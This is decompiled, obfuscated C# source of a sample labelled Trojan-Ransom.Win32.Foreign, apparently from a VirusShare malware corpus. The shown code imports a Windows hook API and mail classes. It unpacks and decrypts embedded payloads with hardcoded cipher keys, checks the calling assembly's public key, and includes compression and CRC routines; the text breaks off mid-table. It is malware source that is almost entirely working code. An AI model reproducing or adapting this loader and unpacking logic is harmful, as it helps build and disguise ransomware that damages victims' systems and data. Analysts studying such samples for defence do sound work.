// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 1, Version=8.93.47.49, Culture=neutral, PublicKeyToken=null
// MVID: DFA8ED2E-5616-44FF-892B-A77949B35FF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Foreign.mxlc-0e45041763d0a87cf14d630d0ef61ca2fbfdc37f1c8a9944dd0c3cfd1cf0aa8a.exe

using \u0006;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0006
{
  internal class \u0007
  {
    static unsafe bool \u0001([In] string obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(22);
      if (true)
        goto label_18;
label_1:
      void* voidPtr;
      char[] chArray1;
      string[] strArray1;
      object Left;
      try
      {
        *(int*) voidPtr = -1;
        IntPtr num2 = (IntPtr) voidPtr + 4;
        *(int*) ((IntPtr) voidPtr + 12) = \u0003.\u0001.\u0001.Length;
        *(int*) num2 = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) <= *(int*) ((IntPtr) voidPtr + 12))
        {
          if (\u0003.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 4)].\u0002.ToLower().CompareTo(obj0.ToLower()) == 0)
          {
            *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4);
            break;
          }
          *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
        }
        if (*(int*) voidPtr == -1)
        {
          *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) 0;
        }
        else
        {
          string str = \u0003.\u0001.\u0001[*(int*) voidPtr].\u0004.Substring(checked (\u0003.\u0001.\u0001[*(int*) voidPtr].\u0004.IndexOf(\u000E.\u0003.\u0001(1969)) + 1));
          chArray1 = new char[1]{ ',' };
          char[] chArray2 = chArray1;
          strArray1 = str.Split(chArray2);
          IntPtr num3 = (IntPtr) voidPtr + 8;
          *(int*) ((IntPtr) voidPtr + 16) = checked (strArray1.Length - 1);
          *(int*) num3 = 0;
          while (*(int*) ((IntPtr) voidPtr + 8) <= *(int*) ((IntPtr) voidPtr + 16))
          {
            strArray1[*(int*) ((IntPtr) voidPtr + 8)] = Strings.LTrim(strArray1[*(int*) ((IntPtr) voidPtr + 8)]);
            Left = (object) strArray1[*(int*) ((IntPtr) voidPtr + 8)].IndexOf(\u000E.\u0003.\u0001(1603));
            if (Operators.ConditionalCompareObjectGreater(Left, (object) 0, false))
              strArray1[*(int*) ((IntPtr) voidPtr + 8)] = strArray1[*(int*) ((IntPtr) voidPtr + 8)].Substring(0, Conversions.ToInteger(Left));
            if (strArray1[*(int*) ((IntPtr) voidPtr + 8)].IndexOf(\u0007.\u0001(\u000E.\u0003.\u0001(1974), \u000E.\u0003.\u0001(55))) != 0)
            {
              \u0003.\u0001.\u0001 = (string[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) \u0003.\u0001.\u0001, (Array) new string[checked (*(int*) unchecked ((IntPtr) voidPtr + 8) + 1)]);
              \u0003.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 8)] = strArray1[*(int*) ((IntPtr) voidPtr + 8)];
              *(int*) ((IntPtr) voidPtr + 8) = checked (*(int*) unchecked ((IntPtr) voidPtr + 8) + 1);
            }
            else
              break;
          }
          *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) \u0007.\u0001(checked ((ulong) ((\u0003.\u0001.\u0001[*(int*) voidPtr].\u0002 - 1L) * (long) \u0003.\u0001.\u0001)));
        }
        *(sbyte*) ((IntPtr) voidPtr + 21) = *(sbyte*) ((IntPtr) voidPtr + 20);
      }
      catch (Exception ex)
      {
        string[] strArray2 = strArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local2 = (ValueType) (bool) *(sbyte*) ((IntPtr) voidPtr + 20);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        object obj = Left;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        char[] chArray3 = chArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        string str = obj0;
        \u0007.\u0001(ex, (object) strArray2, (object) local1, (object) local2, (object) local3, (object) local4, obj, (object) local5, (object) chArray3, (object) local6, (object) str);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 21);
label_18:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static bool \u0001() => \u0007.\u0001().\u0001 == (byte) 1;

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] int obj0, [In] \u0002.\u0001.\u0001 obj1, [In] int obj2, [In] int obj3);

    static int \u0001() => new Version(\u000E.\u0003.\u0001(1991)).Major;

    static unsafe void \u0001([In] \u000F.\u0006.\u0007.\u0001 obj0, [In] \u000F.\u0006.\u0007.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      short[] numArray1;
      IntPtr index;
      int num;
      try
      {
        *(int*) ((IntPtr) voidPtr + 8) = -1;
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002)
        {
          num = 1;
          *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
          if (*(int*) ((IntPtr) voidPtr + 16) != 0)
          {
            *(int*) voidPtr = 6;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            if (*(int*) ((IntPtr) voidPtr + 8) != *(int*) ((IntPtr) voidPtr + 16))
            {
              if (false)
                break;
              (numArray1 = obj0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 16))] = (short) ((int) numArray1[index] + 1);
              num = 0;
            }
          }
          else
            goto label_19;
label_7:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
          {
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
            if (++num >= *(int*) voidPtr)
              break;
          }
          if (num < *(int*) ((IntPtr) voidPtr + 4))
          {
            (numArray1 = obj0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 8))] = (short) ((int) numArray1[index] + (int) (short) num);
            continue;
          }
          if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            (numArray1 = obj0.\u0001)[16] = (short) ((int) numArray1[16] + 1);
            continue;
          }
          if (num <= 10)
          {
            (numArray1 = obj0.\u0001)[17] = (short) ((int) numArray1[17] + 1);
            continue;
          }
          (numArray1 = obj0.\u0001)[18] = (short) ((int) numArray1[18] + 1);
          continue;
label_19:
          *(int*) voidPtr = 138;
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          goto label_7;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        short[] numArray2 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local7 = (ValueType) index;
        \u000F.\u0006.\u0007.\u0001 obj2 = obj1;
        \u000F.\u0006.\u0007.\u0001 obj3 = obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) numArray2, (object) local7, (object) obj2, (object) obj3);
        throw;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
    static extern int \u0001([In] int obj0);

    static string \u0001() => \u000E.\u0003.\u0001(2004) + \u0007.\u0001();

    static void \u0001([In] \u000F.\u0006.\u0006 obj0)
    {
      try
      {
        if (false)
          return;
        obj0.\u0001 |= 12;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0006 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static unsafe bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      byte[] numArray1;
      byte[] publicKey1;
      try
      {
        do
        {
          publicKey1 = obj1.GetName().GetPublicKey();
          byte[] publicKey2 = obj0.GetName().GetPublicKey();
          if (true)
            goto label_18;
label_3:
          int num1 = numArray1 == null ? 1 : 0;
          while (true)
          {
            int num2 = publicKey1 == null ? 1 : 0;
            if (num1 == num2)
            {
              if (numArray1 != null)
              {
                if (true)
                  *(int*) voidPtr = 0;
                int num3;
                while (true)
                {
                  num3 = *(int*) voidPtr;
                  if (true)
                  {
                    int num4 = numArray1.Length;
                    if (true)
                      num4 = num4;
                    if (num3 < num4)
                    {
                      if ((int) numArray1[*(int*) voidPtr] == (int) publicKey1[*(int*) voidPtr])
                        *(int*) voidPtr = *(int*) voidPtr + 1;
                      else
                        goto label_11;
                    }
                    else
                      goto label_17;
                  }
                  else
                    break;
                }
                num1 = num3;
              }
              else
                goto label_17;
            }
            else
              break;
          }
          continue;
label_18:
          numArray1 = publicKey2;
          goto label_3;
        }
        while (false);
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
        goto label_20;
label_11:
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
        goto label_20;
label_17:
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
      }
      catch (Exception ex)
      {
        byte[] numArray2 = publicKey1;
        byte[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) *(int*) voidPtr;
        Assembly assembly1 = obj1;
        Assembly assembly2 = obj0;
        \u0007.\u0001(ex, (object) numArray2, (object) numArray3, (object) local, (object) assembly1, (object) assembly2);
        throw;
      }
label_20:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
    }

    static unsafe void \u0001([In] \u000F.\u0006.\u0007.\u0001 obj0, [In] int[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      int[] numArray1;
      int num1;
      int[] numArray2;
      IntPtr index1;
      int num2;
      int num3;
      int index2;
      try
      {
        obj0.\u0001 = new byte[obj0.\u0001.Length];
        *(int*) voidPtr = obj1.Length / 2;
        *(int*) ((IntPtr) voidPtr + 4) = (*(int*) voidPtr + 1) / 2;
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        while (true)
        {
          if (*(int*) ((IntPtr) voidPtr + 12) >= obj0.\u0003)
            goto label_4;
label_2:
          obj0.\u0001[*(int*) ((IntPtr) voidPtr + 12)] = 0;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          continue;
label_4:
          numArray1 = new int[*(int*) voidPtr];
          numArray1[*(int*) voidPtr - 1] = 0;
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) voidPtr - 1;
          if (true)
            goto label_11;
label_10:
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 1;
label_11:
          if (*(int*) ((IntPtr) voidPtr + 16) >= 0)
          {
            if (obj1[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] != -1)
            {
              *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)] + 1;
              if (*(int*) ((IntPtr) voidPtr + 20) > obj0.\u0003)
              {
                *(int*) ((IntPtr) voidPtr + 20) = obj0.\u0003;
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              }
              int[] numArray3 = numArray1;
              int index3 = obj1[2 * *(int*) ((IntPtr) voidPtr + 16)];
              numArray1[obj1[2 * *(int*) ((IntPtr) voidPtr + 16) + 1]] = num1 = *(int*) ((IntPtr) voidPtr + 20);
              int num4 = num1;
              numArray3[index3] = num4;
              goto label_10;
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 24) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
              (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (*(int*) ((IntPtr) voidPtr + 24) - 1))] = numArray2[index1] + 1;
              obj0.\u0001[obj1[2 * *(int*) ((IntPtr) voidPtr + 16)]] = (byte) numArray1[*(int*) ((IntPtr) voidPtr + 16)];
              goto label_10;
            }
          }
          else if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            num2 = obj0.\u0003 - 1;
            do
            {
              do
                ;
              while (obj0.\u0001[--num2] == 0);
              do
              {
                (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) num2)] = numArray2[index1] - 1;
                int[] numArray4;
                numArray2 = numArray4 = obj0.\u0001;
                int index4;
                num2 = index4 = num2 + 1;
                index1 = (IntPtr) index4;
                int num5 = numArray2[index1] + 1;
                numArray4[index4] = num5;
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (1 << obj0.\u0003 - 1 - num2);
              }
              while (*(int*) ((IntPtr) voidPtr + 8) > 0 && num2 < obj0.\u0003 - 1);
            }
            while (*(int*) ((IntPtr) voidPtr + 8) > 0);
            (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (obj0.\u0003 - 1))] = numArray2[index1] + *(int*) ((IntPtr) voidPtr + 8);
            (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (obj0.\u0003 - 2))] = numArray2[index1] - *(int*) ((IntPtr) voidPtr + 8);
            num3 = 2 * *(int*) ((IntPtr) voidPtr + 4);
            *(int*) ((IntPtr) voidPtr + 28) = obj0.\u0003;
            while (*(int*) ((IntPtr) voidPtr + 28) != 0)
            {
              *(int*) ((IntPtr) voidPtr + 32) = obj0.\u0001[*(int*) ((IntPtr) voidPtr + 28) - 1];
              while (*(int*) ((IntPtr) voidPtr + 32) > 0)
              {
                index2 = 2 * obj1[num3++];
                if (true)
                {
                  if (obj1[index2 + 1] == -1)
                  {
                    obj0.\u0001[obj1[index2]] = (byte) *(int*) ((IntPtr) voidPtr + 28);
                    *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
                  }
                }
                else
                  goto label_2;
              }
              *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) - 1;
            }
            goto label_13;
          }
          else
            break;
        }
        return;
label_13:;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[18]
        {
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) numArray1,
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) num2,
          (object) num3,
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) index2,
          (object) num1,
          (object) numArray2,
          (object) index1,
          (object) obj0,
          (object) obj1
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static unsafe byte[] \u0001([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      \u000F.\u0006.\u000F obj1;
      byte[] numArray1;
      byte[] buffer1;
      byte[] buffer2;
      byte[] buffer3;
      \u000F.\u0006.\u0001 obj2;
      byte[] buffer4;
      \u000F.\u0006.\u0001 obj3;
      byte[] numArray2;
      byte[] numArray3;
      \u0008.\u0004 obj4;
      ICryptoTransform cryptoTransform1;
      byte[] numArray4;
      byte[] numArray5;
      byte[] numArray6;
      \u000F.\u0005 obj5;
      ICryptoTransform cryptoTransform2;
      byte[] numArray7;
      Assembly callingAssembly;
      Assembly executingAssembly;
      try
      {
        callingAssembly = Assembly.GetCallingAssembly();
        executingAssembly = Assembly.GetExecutingAssembly();
        if ((object) callingAssembly != (object) executingAssembly && !\u0007.\u0001(callingAssembly, executingAssembly))
          return (byte[]) null;
        obj1 = new \u000F.\u0006.\u000F(obj0);
        numArray1 = new byte[0];
        *(int*) voidPtr = \u0007.\u0001(obj1);
        if (*(int*) voidPtr == 67324752)
        {
          *(short*) ((IntPtr) voidPtr + 44) = (short) \u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 8) = \u0007.\u0001(obj1);
          if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
            throw new FormatException("Wrong Header Signature");
          \u0007.\u0001(obj1);
          \u0007.\u0001(obj1);
          \u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 12) = \u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 16) = \u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 20) = \u0007.\u0001(obj1);
          if (*(int*) ((IntPtr) voidPtr + 16) > 0)
          {
            buffer1 = new byte[*(int*) ((IntPtr) voidPtr + 16)];
            obj1.Read(buffer1, 0, *(int*) ((IntPtr) voidPtr + 16));
          }
          if (*(int*) ((IntPtr) voidPtr + 20) > 0)
          {
            buffer2 = new byte[*(int*) ((IntPtr) voidPtr + 20)];
            obj1.Read(buffer2, 0, *(int*) ((IntPtr) voidPtr + 20));
          }
          buffer3 = new byte[obj1.Length - obj1.Position];
          obj1.Read(buffer3, 0, buffer3.Length);
          obj2 = new \u000F.\u0006.\u0001(buffer3);
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
          \u0007.\u0001(numArray1.Length, 0, obj2, numArray1);
          buffer3 = (byte[]) null;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
          *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
          if (*(int*) voidPtr != 8223355)
            throw new FormatException("Unknown Header");
          if (*(int*) ((IntPtr) voidPtr + 24) == 1)
          {
            *(int*) ((IntPtr) voidPtr + 28) = \u0007.\u0001(obj1);
            numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
            *(int*) ((IntPtr) voidPtr + 32) = 0;
            while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
            {
              *(int*) ((IntPtr) voidPtr + 36) = \u0007.\u0001(obj1);
              *(int*) ((IntPtr) voidPtr + 40) = \u0007.\u0001(obj1);
              buffer4 = new byte[*(int*) ((IntPtr) voidPtr + 36)];
              obj1.Read(buffer4, 0, buffer4.Length);
              obj3 = new \u000F.\u0006.\u0001(buffer4);
              \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 40), *(int*) ((IntPtr) voidPtr + 32), obj3, numArray1);
              *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
            }
          }
          if (*(int*) ((IntPtr) voidPtr + 24) == 2)
          {
            numArray2 = new byte[8]
            {
              (byte) 189,
              (byte) 65,
              (byte) 172,
              (byte) 123,
              (byte) 224,
              (byte) 47,
              (byte) 74,
              (byte) 162
            };
            numArray3 = new byte[8]
            {
              (byte) 23,
              (byte) 241,
              (byte) 227,
              (byte) 32,
              (byte) 190,
              (byte) 23,
              (byte) 76,
              (byte) 117
            };
            obj4 = new \u0008.\u0004();
            try
            {
              cryptoTransform1 = \u0007.\u0001(numArray2, obj4, numArray3, true);
              try
              {
                numArray4 = cryptoTransform1.TransformFinalBlock(obj0, 4, obj0.Length - 4);
                numArray1 = \u0007.\u0001(numArray4);
              }
              finally
              {
                cryptoTransform1?.Dispose();
              }
            }
            finally
            {
              ((IDisposable) obj4)?.Dispose();
            }
          }
          if (*(int*) ((IntPtr) voidPtr + 24) == 3)
          {
            numArray5 = new byte[16]
            {
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1
            };
            numArray6 = new byte[16]
            {
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2
            };
            obj5 = new \u000F.\u0005();
            try
            {
              cryptoTransform2 = \u0007.\u0001(numArray5, true, numArray6, obj5);
              try
              {
                numArray7 = cryptoTransform2.TransformFinalBlock(obj0, 4, obj0.Length - 4);
                numArray1 = \u0007.\u0001(numArray7);
              }
              finally
              {
                cryptoTransform2?.Dispose();
              }
            }
            finally
            {
              ((IDisposable) obj5)?.Dispose();
            }
          }
        }
        obj1.Close();
        return numArray1;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[33]
        {
          (object) callingAssembly,
          (object) executingAssembly,
          (object) obj1,
          (object) numArray1,
          (object) *(int*) voidPtr,
          (object) *(short*) ((IntPtr) voidPtr + 44),
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) buffer1,
          (object) buffer2,
          (object) buffer3,
          (object) obj2,
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) *(int*) ((IntPtr) voidPtr + 40),
          (object) obj3,
          (object) buffer4,
          (object) numArray2,
          (object) numArray3,
          (object) obj4,
          (object) cryptoTransform1,
          (object) numArray4,
          (object) numArray5,
          (object) numArray6,
          (object) obj5,
          (object) cryptoTransform2,
          (object) numArray7,
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static unsafe ulong \u0001([In] int obj0, [In] int obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(32);
      try
      {
        if (!(obj1 > 8 | obj1 == 0))
          goto label_6;
        else
          goto label_5;
label_4:
        *(long*) ((IntPtr) voidPtr + 16) = *(long*) voidPtr;
        goto label_9;
label_5:
        *(long*) voidPtr = 0L;
        goto label_4;
label_6:
        *(long*) ((IntPtr) voidPtr + 8) = 0L;
        IntPtr num = (IntPtr) voidPtr + 24;
        *(int*) ((IntPtr) voidPtr + 28) = checked (obj1 - 1);
        *(int*) num = 0;
        while (*(int*) ((IntPtr) voidPtr + 24) <= *(int*) ((IntPtr) voidPtr + 28))
        {
          *(long*) ((IntPtr) voidPtr + 8) = *(long*) ((IntPtr) voidPtr + 8) << 8 | (long) \u0003.\u0001.\u0001[checked (obj0 + *(int*) unchecked ((IntPtr) voidPtr + 24))];
          *(int*) ((IntPtr) voidPtr + 24) = checked (*(int*) unchecked ((IntPtr) voidPtr + 24) + 1);
        }
        *(long*) voidPtr = *(long*) ((IntPtr) voidPtr + 8);
        goto label_4;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<ulong> local1 = (ValueType) (ulong) *(long*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<ulong> local2 = (ValueType) (ulong) *(long*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 24);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 28);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) obj1;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6);
        throw;
      }
label_9:
      return (ulong) *(long*) ((IntPtr) voidPtr + 16);
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7)
    {
      if (false)
        return;
      \u0007.\u0001(obj0, new object[7]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7
      });
    }

    static bool \u0001()
    {
      bool flag;
      try
      {
        \u0003.\u0004.\u0002 obj;
        do
        {
          obj = new \u0003.\u0004.\u0002();
        }
        while (false);
        \u0007.\u0001(ref obj);
        int num1 = (int) obj.\u0001;
        int num2;
        while (true)
        {
          num2 = num1 == 9 ? 1 : 0;
          if (false)
            num1 = num2;
          else if (false)
            num1 = num2;
          else
            break;
        }
        flag = num2 != 0;
      }
      catch
      {
        flag = false;
      }
      return flag;
    }

    static bool \u0001([In] int obj0, [In] \u000F.\u0006.\u0007 obj1)
    {
      short[] numArray1;
      int num1;
      int index1;
      try
      {
        obj1.\u0001[obj1.\u0001] = (short) 0;
        byte[] numArray2 = obj1.\u0002;
        \u000F.\u0006.\u0007 obj = obj1;
        int num2;
        num1 = num2 = obj.\u0001;
        obj.\u0001 = num2 + 1;
        int index2 = num1;
        int num3 = (int) (byte) obj0;
        numArray2[index2] = (byte) num3;
        (numArray1 = obj1.\u0001.\u0001)[index1 = obj0] = (short) ((int) numArray1[(IntPtr) index1] + 1);
        return \u0007.\u0001(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        short[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local2 = (ValueType) (IntPtr) index1;
        \u000F.\u0006.\u0007 obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj0;
        \u0007.\u0001(ex, (object) local1, (object) numArray3, (object) local2, (object) obj, (object) local3);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0004 obj0)
    {
      try
      {
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        \u0008.\u0004 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static object \u0001([In] \u000E.\u0005 obj0) => obj0.\u0001;

    static unsafe byte[] \u0001([In] byte[] obj0, [In] byte[] obj1, [In] int obj2, [In] byte[] obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(64);
      DateTime now;
      uint[] numArray1;
      uint num1;
      int num2;
      int length;
      \u000F.\u0006.\u000F obj4;
      byte[] bytes;
      \u000F.\u0006.\u0006 obj5;
      byte[] buffer1;
      byte[] buffer2;
      byte[] dst;
      \u000F.\u0006.\u0006 obj6;
      byte[] buffer3;
      byte[] buffer4;
      byte[] inputBuffer1;
      \u0008.\u0004 obj7;
      ICryptoTransform cryptoTransform1;
      byte[] buffer5;
      byte[] inputBuffer2;
      \u000F.\u0005 obj8;
      ICryptoTransform cryptoTransform2;
      byte[] buffer6;
      try
      {
        byte[] array;
        try
        {
          obj4 = new \u000F.\u0006.\u000F();
          switch (obj2)
          {
            case 0:
              \u000F.\u0006.\u0006 obj9 = new \u000F.\u0006.\u0006();
              if (true)
                obj5 = obj9;
              now = DateTime.Now;
              do
              {
                *(long*) voidPtr = (long) ((uint) ((now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11 | now.Minute << 5) | (uint) now.Second >> 1);
                numArray1 = new uint[256]
                {
                  0U,
                  1996959894U,
                  3993919788U,
                  2567524794U,
                  124634137U,
                  1886057615U,
                  3915621685U,
                  2657392035U,
                  249268274U,
                  2044508324U,
                  3772115230U,
                  2547177864U,
                  162941995U,
                  2125561021U,
                  3887607047U,
                  2428444049U,
                  498536548U,
                  1789927666U,
                  4089016648U,
                  2227061214U,
                  450548861U,
                  1843258603U,
                  4107580753U,
                  2211677639U,
                  325883990U,
                  1684777152U,
                  4251122042U,
                  2321926636U,
                  335633487U,
                  1661365465U,
                  4195302755U,
                  2366115317U,
